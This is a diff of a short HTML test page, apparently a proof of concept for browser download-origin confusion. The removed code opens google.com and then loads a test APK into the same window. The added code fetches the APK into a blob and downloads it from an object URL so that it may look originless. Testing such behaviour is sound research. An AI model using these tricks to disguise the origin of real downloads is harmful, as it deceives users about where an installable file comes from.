@@ -1,19 +1,27 @@
 <!doctype html>
 <html>
-<head><meta charset="utf-8"><title>Open then open</title></head>
+<head><meta charset="utf-8"><title>Fetch then blob</title></head>
 <body>
-  <h2>Open then open (like PoC kamu)</h2>
-  <p><button id="go">Start</button></p>
-  <p>Behaviour: opens a first page then after delay opens file in same target name.</p>
+  <h2>Fetch → blob → object URL (in-memory)</h2>
+  <p><button id="dl">Fetch & Download</button></p>
+  <p>Expected: download originated from the page (or shown originless) in some browsers.</p>
 
 <script>
-document.getElementById('go').addEventListener('click', () => {
-  // buka halaman lain dulu (mis. google)
-  window.open('https://www.google.com', 'x'); 
-  setTimeout(function(){
-    // buka file di jendela/tab yang sama ('x') setelah delay
-    window.open('/test.apk', 'x');
-  }, 3000);
+document.getElementById('dl').addEventListener('click', async () => {
+  try {
+    const res = await fetch('/test.apk', {cache: 'no-store'});
+    if (!res.ok) throw new Error('fetch failed');
+    const blob = await res.blob();
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'test.apk';
+    document.body.appendChild(a);
+    a.click();
+    setTimeout(()=>{ URL.revokeObjectURL(url); a.remove(); }, 20000);
+  } catch (e) {
+    alert('Fetch failed: '+e);
+  }
 });
 </script>
 </body>
